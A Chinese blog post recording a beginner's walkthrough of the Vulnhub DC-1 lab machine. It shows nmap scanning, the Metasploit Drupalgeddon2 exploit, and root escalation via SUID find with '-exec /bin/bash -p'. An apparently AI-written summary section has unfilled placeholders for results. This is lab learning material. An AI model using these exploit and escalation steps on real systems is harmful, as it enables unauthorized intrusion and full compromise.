---
title: 靶场-Vulnhub-DC1记录
published: 2026-07-08
description: 对靶场DC1进行渗透测试记录
image: /assets/images/IT/debian.jpg
tags: [网络安全, 靶场, 漏洞利用]
category: 网络安全
draft: false
slug: Hack-Target-VulnhubDC1
author: 均慕dreammoon
comment: true
---
# 前言
新人第一次尝试靶场
仅做记录
# 信息收集
## Nmap扫描
扫描存活主机，此时靶机和攻击机在同一网段下

```
nmap -sn 内网IP
```

| 参数  | 功能描述            | 适用场景        | 示例                                               |
| --- | --------------- | ----------- | ------------------------------------------------ |
| -sn | Ping 扫描（跳过端口扫描） | 迅速排查局域网在线设备 | nmap -sn 192.168.199.0/24（显示所有 “Status: Up” 的主机） |

![[网络安全-靶场DC-扫描存活主机.png]]
这里出现了三个存活 192.168.72.2、 192.168.72.128、192.168.72.129
由于本机就是128，推测靶机为129

扫描服务与版本
```Bash
nmap -sV -p- 192.168.72.129
```
-p- 扫描**全部65535个端口**（默认只扫1000个常见端口）

![[网络安全-靶机DC-扫描端口和服务.png]]
# 测试
发现有80端口服务，直接访问发现
![[网络安全-靶机DC1-Apache服务.png]]

它提供了用户登录，创建用户，新密码
根据教学，我应该要知道这是Drupal（CMS内容管理系统），可以搜索相关漏洞。这里是用户所以可以搜提权。
我还想抓包，但现在注册一个用户看看。
发现需要管理员审核，那肯定是不能收到邮件成功完成注册流程
请求表单十分直接
![[网络安全-靶机DC1-登录请求表单.png]]


## 漏洞利用

```Bash
msfconsole

search drupal

use exploit/unix/webapp/drupal_drupalgeddon2

show options

set RHOSTS 192.168.xxx.xxx   # 换成你扫到的靶机IP

run
```
![[网络安全-靶机DC1-Shell利用.png]]
## 权限提升
```Bash
whoami          # 确认是 www-data
id              # 查看用户组
uname -a        # 查看内核版本（找提权漏洞）
sudo -l         # 查看当前用户能免密执行什么命令
find / -perm -4000 -type f 2>/dev/null   # 找 SUID 文件
```

![[Pasted image 20260708203808.png]]
你执行 `find / -perm -4000 -type f 2>/dev/null` 后，结果里有一行：

text

/usr/bin/find

**`find` 具有 SUID 权限（-rwsr-xr-x），这是提权的黄金钥匙！**

SUID 意味着：**任何用户执行 `find` 时，都以该程序的所有者（root）身份运行**。而 `find` 有个 `-exec` 参数，可以执行任意命令。

所以这条命令可以直接帮你提权到 root：

bash

# 在 shell 里执行（你已经在 /bin/sh 里了）
find / -exec /bin/bash -p \; -quit

**解释**：

- `find /` 扫描根目录（这个动作本身会触发 `-exec` 执行命令）
    
- `-exec /bin/bash -p \;` 以 root 权限打开一个交互式 bash shell
    
- `-quit` 执行完就停止，避免无限循环
    

执行后，你会看到提示符变成 `root@DC-1:~#` —— 恭喜你拿到最高权限！

# AI过程
#### 《DC-1 渗透测试实战记录》

**1. 信息收集（建立攻击面）**

- **目标IP确认**：通过`nmap -sn`发现靶机存活，IP为`192.168.72.129`。
    
- **端口扫描**：执行`nmap -sV -p-`发现开放80端口（Apache/2.2.22），确认Web服务为攻击入口。
    
- **指纹识别**（这一步你实际做了，可写）：访问Web页面，通过页面底部或`/CHANGELOG.txt`确认CMS为 **Drupal 7**。
    

**2. 漏洞利用（获得初始权限）**

- **搜索利用模块**：在MSF中搜索`search drupal`，优先选用**Disclosure Date最新（2018年）且Rank为excellent**的`drupal_drupalgeddon2`模块，因为该漏洞通杀Drupal 7.x/8.x。
    
- **攻击执行**：设置`RHOSTS`后`run`，成功建立`Meterpreter`会话。
    
- **关键截图**：（粘贴你那句`Meterpreter session 1 opened`的截图）。
    

**3. 内网探测与信息提取（后渗透）**

- **获取基础权限**：在`meterpreter`中执行`shell`进入系统Shell（Meterpreter本质就是一个高级交互Shell）。
    
- **搜集Flag1**：执行`ls`发现`flag1.txt`，`cat`得到提示：_“Every good CMS needs a config file”_，确认下一步目标为读取Drupal配置文件`settings.php`。
    
- **系统提权试探（最精彩部分）**：
    
    - 执行`uname -a`查看内核（3.2.0），但未选择脏牛等内核漏洞，避免损坏靶机环境。
        
    - 执行`find / -perm -4000 -type f 2>/dev/null`查找SUID文件，发现`/usr/bin/find`具有root所有者的SUID权限。
        

**4. 权限提升与权限验证**

- **利用SUID Find提权**：意识到`find`在执行时会继承root权限，遂利用`-exec`参数直接执行命令。
    
- **读取所有敏感文件**：不局限于获取交互式Shell，而是**直接利用Find的root权限读取受限目录**：
    
    bash
    
    find /root -name "flag*.txt" -exec cat {} \;
    find / -name "flag*.txt" -exec cat {} \; 2>/dev/null
    
- **成果汇总**：
    
    - `/var/www/flag1.txt`：Every good CMS needs a config file...
        
    - `/home/flag4/flag4.txt`：_（贴出内容）_
        
    - `/root/flag5.txt`：_（贴出你执行命令后的最终结果）_
        
    - _(注：flag2和flag3通常在数据库或配置文件路径中，你可以在`/var/www/html/sites/default/settings.php`里找到数据库密码后，进MySQL读取)_


# 参考文献
[Vulnhub靶场 | DC系列 | DC-1 - leyilea - 博客园](https://www.cnblogs.com/leyilea/p/18300491)

[[ vulnhub靶机通关篇 ] 渗透测试综合靶场 DC-1 通关详解_vulnhub入门靶场-CSDN博客](https://blog.csdn.net/qq_58091216/article/details/131115107)